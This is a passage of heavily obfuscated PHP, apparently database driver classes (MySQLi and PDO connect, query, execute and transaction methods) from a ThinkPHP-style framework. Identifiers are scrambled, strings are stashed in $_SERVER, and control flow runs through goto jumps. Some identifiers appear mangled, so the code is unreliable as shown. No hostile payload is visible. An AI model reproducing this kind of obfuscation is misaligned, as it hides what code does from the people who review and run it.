$aùÖß¥Ë¼, 256), $F“Ÿ…ê“Ë‡); if (1 == $CÃÄ‰‰§ó) { $e“·”ºñ• = $F“Ÿ…ê“Ë‡[1]; $aùÖß¥Ë¼ += strlen($e“·”ºñ•); } break; case $FÆé Àº¢º[245]: case $FÆé Àº¢º[823]: $E‰­ÅéÂŞÁ = $dÏ©ÀÅ’¹´; ++$aùÖß¥Ë¼; $eôÙëÌã‘² = $aùÖß¥Ë¼; if ($FÆé Àº¢º[245] == $dÏ©ÀÅ’¹´) { $CÄøçƒÏ•ì = 1; while ($CÄøçƒÏ•ì > 0) { if (!isset($Aëîø»ÊßÜ[$eôÙëÌã‘²])) { break; } $BÉ¾‘ƒ¤³À = $Aëîø»ÊßÜ[$eôÙëÌã‘²]; switch ($BÉ¾‘ƒ¤³À) { case $FÆé Àº¢º[94]: ++$eôÙëÌã‘²; break; case $FÆé Àº¢º[245]: ++$CÄøçƒÏ•ì; break; case $FÆé Àº¢º[823]: --$CÄøçƒÏ•ì; break; } ++$eôÙëÌã‘²; } $e“·”ºñ• = substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, $eôÙëÌã‘² - $aùÖß¥Ë¼ - 1); $aùÖß¥Ë¼ = $eôÙëÌã‘²; } break; case $FÆé Àº¢º[154]: case $FÆé Àº¢º[468]: $E‰­ÅéÂŞÁ = $dÏ©ÀÅ’¹´; ++$aùÖß¥Ë¼; if ($FÆé Àº¢º[154] == $dÏ©ÀÅ’¹´) { $e“·”ºñ• = array(); do { $aîº†²î¼ = $aùÖß¥Ë¼; $F„±™ÇäÀ— = self::getRawObject($Aëîø»ÊßÜ, $aùÖß¥Ë¼); $aùÖß¥Ë¼ = $F„±™ÇäÀ—[2]; $e“·”ºñ•[] = $F„±™ÇäÀ—; } while ($FÆé Àº¢º[468] != $F„±™ÇäÀ—[0] && $aùÖß¥Ë¼ != $aîº†²î¼); array_pop($e“·”ºñ•); } break; case $FÆé Àº¢º[932]: case $FÆé Àº¢º[935]: if (isset($Aëîø»ÊßÜ[$aùÖß¥Ë¼ + 1]) && $Aëîø»ÊßÜ[$aùÖß¥Ë¼ + 1] == $dÏ©ÀÅ’¹´) { $E‰­ÅéÂŞÁ = $dÏ©ÀÅ’¹´ . $dÏ©ÀÅ’¹´; $aùÖß¥Ë¼ += 2; if ($FÆé Àº¢º[932] == $dÏ©ÀÅ’¹´) { $e“·”ºñ• = array(); do { $aîº†²î¼ = $aùÖß¥Ë¼; $F„±™ÇäÀ— = self::getRawObject($Aëîø»ÊßÜ, $aùÖß¥Ë¼); $aùÖß¥Ë¼ = $F„±™ÇäÀ—[2]; $e“·”ºñ•[] = $F„±™ÇäÀ—; } while ($FÆé Àº¢º[1504] != $F„±™ÇäÀ—[0] && $aùÖß¥Ë¼ != $aîº†²î¼); array_pop($e“·”ºñ•); } } else { $E‰­ÅéÂŞÁ = $dÏ©ÀÅ’¹´; ++$aùÖß¥Ë¼; $CÃÄ‰‰§ó = preg_match($FÆé Àº¢º[1505], substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼), $F“Ÿ…ê“Ë‡); if ($FÆé Àº¢º[932] == $dÏ©ÀÅ’¹´ && 1 == $CÃÄ‰‰§ó) { $e“·”ºñ• = strtr($F“Ÿ…ê“Ë‡[1], $FÆé Àº¢º[1506], $FÆé Àº¢º[33]); $aùÖß¥Ë¼ += \strlen($F“Ÿ…ê“Ë‡[0]); } elseif (!1 !== ($eÜÚö¶¡‚· = strpos($Aëîø»ÊßÜ, $FÆé Àº¢º[935], $aùÖß¥Ë¼))) { $aùÖß¥Ë¼ = $eÜÚö¶¡‚· + 1; } } break; default: if ($FÆé Àº¢º[1507] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 6)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1507]; $aùÖß¥Ë¼ += 6; } elseif ($FÆé Àº¢º[100] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 4)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[100]; $aùÖß¥Ë¼ += 4; $e“·”ºñ• = $FÆé Àº¢º[100]; } elseif ($FÆé Àº¢º[1508] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 4)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1509]; $aùÖß¥Ë¼ += 4; $e“·”ºñ• = $FÆé Àº¢º[1508]; } elseif ($FÆé Àº¢º[1510] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 5)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1509]; $aùÖß¥Ë¼ += 5; $e“·”ºñ• = $FÆé Àº¢º[1510]; } elseif ($FÆé Àº¢º[1009] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 6)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1009]; $aùÖß¥Ë¼ += 6; if (1 == preg_match($FÆé Àº¢º[1511], substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼), $F“Ÿ…ê“Ë‡)) { $aùÖß¥Ë¼ += strlen($F“Ÿ…ê“Ë‡[0]); $BÜ¶Ğ¦ğéÖ = $FÆé Àº¢º[1512]; $CÃÄ‰‰§ó = preg_match($BÜ¶Ğ¦ğéÖ, substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼), $F“Ÿ…ê“Ë‡, PREG_OFFSET_CAPTURE); if (1 == $CÃÄ‰‰§ó) { $e“·”ºñ• = substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, $F“Ÿ…ê“Ë‡[0][1]); $aùÖß¥Ë¼ += $F“Ÿ…ê“Ë‡[1][1]; } } } elseif ($FÆé Àº¢º[1513] == substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 9)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1513]; $aùÖß¥Ë¼ += 9; } elseif (1 == preg_match($FÆé Àº¢º[1514], substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 33), $F“Ÿ…ê“Ë‡)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1477]; $aùÖß¥Ë¼ += strlen($F“Ÿ…ê“Ë‡[0]); $e“·”ºñ• = intval($F“Ÿ…ê“Ë‡[1]) . $FÆé Àº¢º[71] . intval($F“Ÿ…ê“Ë‡[2]); } elseif (1 == preg_match($FÆé Àº¢º[1515], substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, 33), $F“Ÿ…ê“Ë‡)) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1516]; $e“·”ºñ• = intval($F“Ÿ…ê“Ë‡[1]) . $FÆé Àº¢º[71] . intval($F“Ÿ…ê“Ë‡[2]); $aùÖß¥Ë¼ += strlen($F“Ÿ…ê“Ë‡[0]); } elseif (($fÎ©”çá±Â = strspn($Aëîø»ÊßÜ, $FÆé Àº¢º[1517], $aùÖß¥Ë¼)) > 0) { $E‰­ÅéÂŞÁ = $FÆé Àº¢º[1518]; $e“·”ºñ• = substr($Aëîø»ÊßÜ, $aùÖß¥Ë¼, $fÎ©”çá±Â); $aùÖß¥Ë¼ += $fÎ©”çá±Â; } break; } goto f½ŒÉçÃê; fÍŞŞ×È: $FÆé Àº¢º =& $_SERVER[¿õñ]; $E‰­ÅéÂŞÁ = $FÆé Àº¢º[33]; $e“·”ºñ• = $FÆé Àº¢º[33]; goto B¥Ë½‡¢Ò´; f½ŒÉçÃê: return array($E‰­ÅéÂŞÁ, $e“·”ºñ•, $aùÖß¥Ë¼); goto d¸”±…æ; d¸”±…æ: } } goto f­•’ì³Ï; a¿Çâ¦à«ø: class DbMysqli extends Db { public function __construct($bÁ·¤í›‹ = '') { $C¨ ‡ÅÜ•Š =& $_SERVER[¿õñ]; if (!extension_loaded($C¨ ‡ÅÜ•Š[831])) { think_exception(think_lang($C¨ ‡ÅÜ•Š[10]) . $C¨ ‡ÅÜ•Š[832]); } if (!empty($bÁ·¤í›‹)) { $this->config = $bÁ·¤í›‹; if (empty($this->config[$C¨ ‡ÅÜ•Š[13]])) { $this->config[$C¨ ‡ÅÜ•Š[13]] = $C¨ ‡ÅÜ•Š[33]; } } } public function connect($BõèŸ£ĞÁ§ = '', $eÊ‰’—¶ÇÇ = 0) { $AöÄ‘¢¨Ù =& $_SERVER[¿õñ]; if (!isset($this->linkID[$eÊ‰’—¶ÇÇ])) { goto d¬‰Îæš£„; bÅƒ™ß¹²£: $this->connected = !0; if (1 != think_config($AöÄ‘¢¨Ù[18])) { unset($this->config); } goto DÌÚ¥ºƒ; fõáñ˜ª¡: $c÷µÛ¥™½÷ = $this->linkID[$eÊ‰’—¶ÇÇ]->server_version; $this->linkID[$eÊ‰’—¶ÇÇ]->query($AöÄ‘¢¨Ù[809] . think_config($AöÄ‘¢¨Ù[810]) . $AöÄ‘¢¨Ù[55]); if ($c÷µÛ¥™½÷ > $AöÄ‘¢¨Ù[811]) { $this->linkID[$eÊ‰’—¶ÇÇ]->query($AöÄ‘¢¨Ù[812]); } goto bÅƒ™ß¹²£; d¬‰Îæš£„: if (empty($BõèŸ£ĞÁ§)) { $BõèŸ£ĞÁ§ = $this->config; } $this->linkID[$eÊ‰’—¶ÇÇ] = new mysqli($BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[805]], $BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[807]], $BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[808]], $BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[17]], $BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[806]] ? intval($BõèŸ£ĞÁ§[$AöÄ‘¢¨Ù[806]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto fõáñ˜ª¡; DÌÚ¥ºƒ: } return $this->linkID[$eÊ‰’—¶ÇÇ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($E©Ê„…Ó‚‹) { goto AÚŞ‹ªµÆó; F½ã±øçß: think_status($bãìîÛõŞ[20]); $this->queryID = $this->_linkID->query($E©Ê„…Ó‚‹); if ($this->_linkID->more_results()) { while (($B×‰‹‰—† = $this->_linkID->next_result()) != NULL) { $B×‰‹‰—†->free_result(); } } goto díõìé–½Ñ; Eâí…ÛùÙ: $this->queryStr = $E©Ê„…Ó‚‹; if ($this->queryID) { $this->free(); } think_action_status($bãìîÛõŞ[19], 1); goto F½ã±øçß; díõìé–½Ñ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto c¸ô«¶£õ—; AÚŞ‹ªµÆó: $bãìîÛõŞ =& $_SERVER[¿õñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Eâí…ÛùÙ; c¸ô«¶£õ—: } public function execute($B¶çôá‰‡·) { goto bÎµÏ“ŸÁá; E­…ª»Ÿç: $this->queryStr = $B¶çôá‰‡·; if ($this->queryID) { $this->free(); } think_action_status($bõù™ƒÀÆÁ[21], 1); goto C†±ëÌÒÙø; bÎµÏ“ŸÁá: $bõù™ƒÀÆÁ =& $_SERVER[¿õñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E­…ª»Ÿç; C†±ëÌÒÙø: think_status($bõù™ƒÀÆÁ[20]); $c©ïÊÃõˆš = $this->_linkID->query($B¶çôá‰‡·); $this->debug(); goto D­Øˆ®Ïµá; D­Øˆ®Ïµá: if (!1 === $c©ïÊÃõˆš) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aŞÏ±‰î™ö; aŞÏ±‰î™ö: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eìš™ï©” = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$eìš™ï©”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bĞÇ¿«Ÿ—Ï = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bĞÇ¿«Ÿ—Ï) { $this->error(); return !1; } } return !0; } private function getAll() { $DíÕÒ½œ³ = array(); if ($this->numRows > 0) { for ($e³ë¡‘ï›’ = 0; $e³ë¡‘ï›’ < $this->numRows; $e³ë¡‘ï›’++) { $DíÕÒ½œ³[$e³ë¡‘ï›’] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $DíÕÒ½œ³; } public function getFields($cîë‚¢İã) { $Fˆ˜àƒ†ô =& $_SERVER[¿õñ]; $F†‘Ãºµ² = $this->query($Fˆ˜àƒ†ô[816] . $this->parseKey($cîë‚¢İã)); $dÊŒ‹ßÇŒ† = array(); if ($F†‘Ãºµ²) { foreach ($F†‘Ãºµ² as $bµ‡Ù¸­Ö¨ => $C‚ƒË–¥ô•) { $dÊŒ‹ßÇŒ†[$C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[27]]] = array($Fˆ˜àƒ†ô[28] => $C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[27]], $Fˆ˜àƒ†ô[29] => $C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[30]], $Fˆ˜àƒ†ô[31] => (bool) ($C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[32]] === $Fˆ˜àƒ†ô[33]), $Fˆ˜àƒ†ô[34] => $C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[35]], $Fˆ˜àƒ†ô[36] => strtolower($C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[37]]) == $Fˆ˜àƒ†ô[38], $Fˆ˜àƒ†ô[39] => strtolower($C‚ƒË–¥ô•[$Fˆ˜àƒ†ô[40]]) == $Fˆ˜àƒ†ô[41]); } } return $dÊŒ‹ßÇŒ†; } public function getTables($F¡ÄñŸòå = '') { $c »º·‡íí =& $_SERVER[¿õñ]; $AäÃÅåßÎ¨ = !empty($F¡ÄñŸòå) ? $c »º·‡íí[818] . $F¡ÄñŸòå : $c »º·‡íí[819]; $aë›òÖ«´ = $this->query($AäÃÅåßÎ¨); $c¥¿ÙÈˆÜ = array(); if ($aë›òÖ«´) { foreach ($aë›òÖ«´ as $fõÔøñŠ” => $Cµˆ¢èõÛ‚) { $c¥¿ÙÈˆÜ[$fõÔøñŠ”] = current($Cµˆ¢èõÛ‚); } } return $c¥¿ÙÈˆÜ; } public function replace($d¨ã–£¬èÊ, $AÓÂ¨ê¢¨ = array()) { $EÁº­Ÿì­ =& $_SERVER[¿õñ]; foreach ($d¨ã–£¬èÊ as $eĞ­‡Ò’Á… => $aŸÕ¾‰ƒÇ•) { $a’åõ±ÆÛù = $this->parseValue($aŸÕ¾‰ƒÇ•); if (is_scalar($a’åõ±ÆÛù)) { $A¥‚–ò±Ô[] = $a’åõ±ÆÛù; $DÅÙóº±[] = $this->parseKey($eĞ­‡Ò’Á…); } } $eÙ»ƒÖ•µ = $EÁº­Ÿì­[820] . $this->parseTable($AÓÂ¨ê¢¨[$EÁº­Ÿì­[264]]) . $EÁº­Ÿì­[821] . implode($EÁº­Ÿì­[47], $DÅÙóº±) . $EÁº­Ÿì­[822] . implode($EÁº­Ÿì­[47], $A¥‚–ò±Ô) . $EÁº­Ÿì­[823]; return $this->execute($eÙ»ƒÖ•µ); } public function insertAll($DéèŒˆÇ„Š, $B¹¿ÏÏ–Å = array(), $fÁÏ‘ì¢Ò = false) { goto aÉ‘éë£¡; Aˆù‰Ô‚æ: $C¾¿Òí¼³ = array(); foreach ($DéèŒˆÇ„Š as $fÃëÏÅñ ³) { $bÃË†ªŒÎÉ = array(); foreach ($fÃëÏÅñ ³ as $cá¸©Å–µ¼ => $aËŸßš³®ê) { $aËŸßš³®ê = $this->parseValue($aËŸßš³®ê); if (is_scalar($aËŸßš³®ê)) { $bÃË†ªŒÎÉ[] = $aËŸßš³®ê; } } $C¾¿Òí¼³[] = $e¶ª¿ˆ¢Àã[245] . implode($e¶ª¿ˆ¢Àã[47], $bÃË†ªŒÎÉ) . $e¶ª¿ˆ¢Àã[823]; } array_walk($eµƒœ‡«ŸŞ, array($this, $e¶ª¿ˆ¢Àã[824])); goto Cì®Şàä; aÉ‘éë£¡: $e¶ª¿ˆ¢Àã =& $_SERVER[¿õñ]; if (!is_array($DéèŒˆÇ„Š[0])) { return !1; } $eµƒœ‡«ŸŞ = array_keys($DéèŒˆÇ„Š[0]); goto Aˆù‰Ô‚æ; Cì®Şàä: $b‹…¶óİÙ… = ($fÁÏ‘ì¢Ò ? $e¶ª¿ˆ¢Àã[825] : $e¶ª¿ˆ¢Àã[826]) . $e¶ª¿ˆ¢Àã[827] . $this->parseTable($B¹¿ÏÏ–Å[$e¶ª¿ˆ¢Àã[264]]) . $e¶ª¿ˆ¢Àã[821] . implode($e¶ª¿ˆ¢Àã[47], $eµƒœ‡«ŸŞ) . $e¶ª¿ˆ¢Àã[828] . implode($e¶ª¿ˆ¢Àã[47], $C¾¿Òí¼³); return $this->execute($b‹…¶óİÙ…); goto cªÂá¥ç¶; cªÂá¥ç¶: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e×äôóˆ¿ =& $_SERVER[¿õñ]; $this->error = $this->_linkID->errno . $e×äôóˆ¿[4] . $this->_linkID->error; if ($e×äôóˆ¿[33] != $this->queryStr) { $this->error .= LNG($e×äôóˆ¿[45]) . $this->queryStr; } think_trace($this->error, $e×äôóˆ¿[33], $e×äôóˆ¿[46]); return $this->error; } public function escapeString($Då´ˆË¨Ö) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Då´ˆË¨Ö); } else { return addslashes($Då´ˆË¨Ö); } } public function parseKey(&$Fóæç¿º¨¥, $f†×Ï×Ã«Ğ = true) { $d‘ÅÅ©¤‚Ò =& $_SERVER[¿õñ]; if ($f†×Ï×Ã«Ğ) { $Fóæç¿º¨¥ = $this->parseKeyCheck($Fóæç¿º¨¥); } if ($Fóæç¿º¨¥ != $d‘ÅÅ©¤‚Ò[173] && !preg_match($d‘ÅÅ©¤‚Ò[829], $Fóæç¿º¨¥)) { $Fóæç¿º¨¥ = $d‘ÅÅ©¤‚Ò[830] . trim($Fóæç¿º¨¥, $d‘ÅÅ©¤‚Ò[830]) . $d‘ÅÅ©¤‚Ò[830]; } return $Fóæç¿º¨¥; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($dÀëÙˆÈ¥ = '') { $D¶ÕŸÉÀ¼­ =& $_SERVER[¿õñ]; if (!class_exists($D¶ÕŸÉÀ¼­[833])) { think_exception(think_lang($D¶ÕŸÉÀ¼­[10]) . $D¶ÕŸÉÀ¼­[834]); } if (!empty($dÀëÙˆÈ¥)) { $this->config = $dÀëÙˆÈ¥; if (empty($this->config[$D¶ÕŸÉÀ¼­[13]])) { $this->config[$D¶ÕŸÉÀ¼­[13]] = array(); } } } public function connect($BŞ¾ãçÙÉ = '', $d‹öÉïÄ× = 0) { $cëŠ·ôÊ¹¢ =& $_SERVER[¿õñ]; if (!isset($this->linkID[$d‹öÉïÄ×])) { goto aš¥¢Ï×“­; FµšÀµ˜¢›: $this->linkID[$d‹öÉïÄ×]->exec($cëŠ·ôÊ¹¢[844] . think_config($cëŠ·ôÊ¹¢[810])); $this->connected = !0; if (1 != think_config($cëŠ·ôÊ¹¢[18])) { unset($this->config); } goto b“õéæ³éÇ; c½Õ£ÖÂÉ: $this->dbType = $this->_getDsnType($BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[835]]); if (in_array($this->dbType, array($cëŠ·ôÊ¹¢[836], $cëŠ·ôÊ¹¢[837], $cëŠ·ôÊ¹¢[838], $cëŠ·ôÊ¹¢[839]))) { think_exception($cëŠ·ôÊ¹¢[840] . $this->dbType . $cëŠ·ôÊ¹¢[841] . $this->dbType . $cëŠ·ôÊ¹¢[842]); } if (!$this->linkID[$d‹öÉïÄ×]) { think_exception($cëŠ·ôÊ¹¢[843]); } goto FµšÀµ˜¢›; aš¥¢Ï×“­: if (empty($BŞ¾ãçÙÉ)) { $BŞ¾ãçÙÉ = $this->config; } if ($this->pconnect) { $BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$d‹öÉïÄ×] = new PDO($BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[835]], $BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[807]], $BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[808]], $BŞ¾ãçÙÉ[$cëŠ·ôÊ¹¢[13]]); } catch (PDOException $DÌçÏÕŸÃ) { think_exception($DÌçÏÕŸÃ->getMessage()); } goto c½Õ£ÖÂÉ; b“õéæ³éÇ: } return $this->linkID[$d‹öÉïÄ×]; } public function free() { $this->PDOStatement = null; } public function query($EÑí×…– Ã, $b¤ˆŸª¨™Ë = array()) { goto BîÒÀÙ¬…; BîÒÀÙ¬…: $E™ –œ¸Ö =& $_SERVER[¿õñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E‚ïÉ“âß±; b³”’Ó²ä: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fá‰ìİ†¥‹ = $this->PDOStatement->execute($b¤ˆŸª¨™Ë); $this->debug(); goto B¶ÜÓá¼ª; B¶ÜÓá¼ª: if (!1 === $fá‰ìİ†¥‹) { $this->error(); return !1; } else { return $this->getAll(); } goto dëÃ¯×—‘; E‚ïÉ“âß±: $this->queryStr = $EÑí×…– Ã; if (!empty($b¤ˆŸª¨™Ë)) { $this->queryStr .= $E™ –œ¸Ö[845] . print_r($b¤ˆŸª¨™Ë, !0) . $E™ –œ¸Ö[846]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cÔø–·©±; cÔø–·©±: think_action_status($E™ –œ¸Ö[19], 1); think_status($E™ –œ¸Ö[20]); $this->PDOStatement = $this->_linkID->prepare($EÑí×…– Ã); goto b³”’Ó²ä; dëÃ¯×—‘: } public function execute($fŸñ§®­Ä…, $Díö‘„¥â = array()) { goto dÇ•‡¬ˆ; E»†ÌÙ“…Ü: if ($this->dbType == $cİØ¦ÀÊí¥[839]) { if (preg_match($cİØ¦ÀÊí¥[847], $this->queryStr, $B‡ˆî°)) { $this->table = think_config($cİØ¦ÀÊí¥[848]) . str_ireplace(think_config($cİØ¦ÀÊí¥[849]), $cİØ¦ÀÊí¥[358], $B‡ˆî°[2]); $bÌ“ƒ±ÇÁ’ = (bool) $this->query($cİØ¦ÀÊí¥[850] . strtoupper($this->table) . $cİØ¦ÀÊí¥[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($cİØ¦ÀÊí¥[21], 1); goto a¥¡–Ë…¦Œ; a¥¡–Ë…¦Œ: think_status($cİØ¦ÀÊí¥[20]); $this->PDOStatement = $this->_linkID->prepare($fŸñ§®­Ä…); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto aç´¤Áä…; dÇ•‡¬ˆ: $cİØ¦ÀÊí¥ =& $_SERVER[¿õñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¡›õÆîÖ…; aç´¤Áä…: $BØìàÁª„Œ = $this->PDOStatement->execute($Díö‘„¥â); $this->debug(); if (!1 === $BØìàÁª„Œ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bÌ“ƒ±ÇÁ’ || preg_match($cİØ¦ÀÊí¥[851], $fŸñ§®­Ä…)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto c‚†Ì­ëÎô; a¡›õÆîÖ…: $this->queryStr = $fŸñ§®­Ä…; if (!empty($Díö‘„¥â)) { $this->queryStr .= $cİØ¦ÀÊí¥[845] . print_r($Díö‘„¥â, !0) . $cİØ¦ÀÊí¥[846]; } $bÌ“ƒ±ÇÁ’ = !1; goto E»†ÌÙ“…Ü; c‚†Ì­ëÎô: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c…¾‘Æ½¥È = $this->_linkID->commit(); $this->transTimes = 0; if (!$c…¾‘Æ½¥È) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a¨×»œƒî´ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a¨×»œƒî´) { $this->error(); return !1; } } return !0; } private function getAll() { $b˜Æ‹­Û·© = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b˜Æ‹­Û·©); return $b˜Æ‹­Û·©; } public function getFields($E¸²±õíÈã) { goto bœ»ä¥ŸÃ; e¤¬Äòá·ß: return $E§óŸŸÒñ; goto f¹Ñİ×¯; DŒ‡ğ×°: $EŠÉãÅÜ = $this->query($EÊÓ›‡Í×); $E§óŸŸÒñ = array(); if ($EŠÉãÅÜ) { foreach ($EŠÉãÅÜ as $f¡à¤£Ìæá => $cŞ‘ƒ­Åôî) { $cŞ‘ƒ­Åôî = array_change_key_case($cŞ‘ƒ­Åôî); $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[28]] = isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[28]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[28]] : $bºŠ£º›Í”[358]; $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[29]] = isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[29]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[29]] : $bºŠ£º›Í”[358]; $f•’…Ş›‹œ = isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[258]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[258]] : $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[28]]; $E§óŸŸÒñ[$f•’…Ş›‹œ] = array($bºŠ£º›Í”[28] => $f•’…Ş›‹œ, $bºŠ£º›Í”[29] => $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[29]], $bºŠ£º›Í”[31] => (bool) (isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[100]]) && $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[100]] === $bºŠ£º›Í”[33] || isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[31]]) && $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[31]] === $bºŠ£º›Í”[33]), $bºŠ£º›Í”[34] => isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[34]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[34]] : (isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[53]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[53]] : $bºŠ£º›Í”[358]), $bºŠ£º›Í”[36] => isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[88]]) ? strtolower($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[88]]) == $bºŠ£º›Í”[38] : (isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[54]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[54]] : !1), $bºŠ£º›Í”[39] => isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[868]]) ? strtolower($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[868]]) == $bºŠ£º›Í”[41] : (isset($cŞ‘ƒ­Åôî[$bºŠ£º›Í”[88]]) ? $cŞ‘ƒ­Åôî[$bºŠ£º›Í”[88]] : !1)); } } goto e¤¬Äòá·ß; bœ»ä¥ŸÃ: $bºŠ£º›Í” =& $_SERVER[¿õñ]; $this->initConnect(!0); if (think_config($bºŠ£º›Í”[852])) { $EÊÓ›‡Í× = str_replace($bºŠ£º›Í”[853], $E¸²±õíÈã, think_config($bºŠ£º›Í”[852])); } else { switch ($this->dbType) { case $bºŠ£º›Í”[836]: case $bºŠ£º›Í”[854]: $EÊÓ›‡Í× = "\x53\x45\114\105\x43\124\40\x20\40\143\157\154\x75\155\156\x5f\156\x61\155\x65\40\141\163\40\x27\x4e\x61\155\x65\47\x2c\x20\x20\x20\144\141\164\141\x5f\164\x79\160\x65\40\141\x73\x20\47\x54\x79\160\145\47\54\40\40\x20\143\157\154\x75\155\156\137\144\x65\x66\141\x75\x6c\x74\x20\x61\x73\40\x27\x44\145\x66\141\165\154\x74\x27\x2c\x20\x20\40\x69\x73\137\x6e\x75\154\154\x61\x62\154\145\40\x61\x73\x20\47\x4e\165\154\x6c\x27\xa\x9\x9\106\x52\x4f\x4d\11\151\156\x66\157\x72\x6d\x61\x74\x69\x6f\x6e\137\163\x63\150\145\x6d\x61\56\x74\141\x62\154\145\163\x20\x41\x53\40\164\xa\x9\11\x4a\117\111\116\x9\151\156\146\157\162\155\141\x74\151\157\156\137\163\x63\150\145\x6d\x61\x2e\x63\x6f\154\165\155\x6e\163\40\x41\123\x20\143\12\x9\x9\117\x4e\x20\x20\x74\x2e\164\x61\142\154\x65\137\143\x61\x74\x61\x6c\157\x67\x20\x3d\x20\x63\x2e\x74\141\x62\x6c\x65\x5f\143\141\164\x61\x6c\x6f\x67\xa\x9\x9\101\x4e\104\40\x74\x2e\x74\x61\x62\154\x65\137\163\x63\x68\145\155\x61\40\x3d\40\x63\x2e\x74\141\142\x6c\145\137\163\x63\150\145\x6d\x61\xa\11\x9\x41\x4e\104\40\164\56\x74\x61\142\154\x65\137\156\141\155\145\x20\75\x20\x63\56\x74\141\142\154\x65\137\156\141\155\x65\12\11\11\x57\x48\105\122\105\40\40\x20\x74\56\x74\141\142\154\x65\x5f\x6e\141\155\145\40\75\x20\x27{$E¸²±õíÈã}\47"; break; case $bºŠ£º›Í”[855]: $EÊÓ›‡Í× = 